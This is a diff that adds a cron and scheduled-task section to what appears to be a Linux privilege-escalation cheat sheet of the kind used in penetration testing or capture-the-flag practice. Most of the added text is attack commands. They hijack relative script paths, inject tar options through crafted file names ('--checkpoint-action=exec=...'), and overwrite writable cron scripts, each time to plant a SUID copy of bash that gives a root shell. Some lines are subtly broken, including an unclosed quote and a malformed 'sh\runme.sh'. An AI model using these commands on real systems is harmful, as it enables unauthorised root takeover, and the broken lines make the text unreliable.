@@ -172,3 +172,58 @@ If a shortcut is being used, we abuse the `$PATH` and "hijack" it. In order to d
 *Abuse capabilities to get higher privileges*
 
     getcap -r / 2>/dev/null
+
+## [SCHEDULED TASKS]
+
+*Abuse scheduled tasks made by a higher privileged user in order to privesc*
+
+### *Hunt Task Schedules*
+
+*Find scheduled tasks.*
+
+    cat /etc/crontab
+    systemctl list-timers --all
+    
+### *Cron Paths Abuse*
+
+*If we have a scheduled task to run a script that doesn't use the absolute path of said script, we could possibly hijack it by creating a script of the same name at a higher priority in the PATH*
+
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <HIGHER PRIORITY PATH>/<SCRIPT NAME>.sh
+    chmod +x <HIGHER PRIORITY PATH>/<SCRIPT NAME>.sh
+
+### *Cron Wildcards*
+
+*If a scheduled task uses an asterick `*` in its script, it could possibly be used to privesc. Use the following example for guidance.*
+
+*Target cron task*
+```
+#!/bin/bash
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+*We can abuse this crontask by forcing it to run a malicious script before completing its task.*
+
+```
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+chmod +x /home/user/runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\runme.sh
+```
+
+Next, we can `/tmp/bash -p` and we will have root.
+
+
+### *Cron File Overwrites*
+
+*Overwrite / append a script used in a crontask with malicious code if we have rw access to it.*
+
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash >> <PATH OF OVERWRITEABLE FILE>/<OW FILE>.sh
+ 
+ ## [NFS ROOT SQUASHING]
+ 
+ >WIP
+ 
+ ## [DOCKER]
+ 
+ >WIP
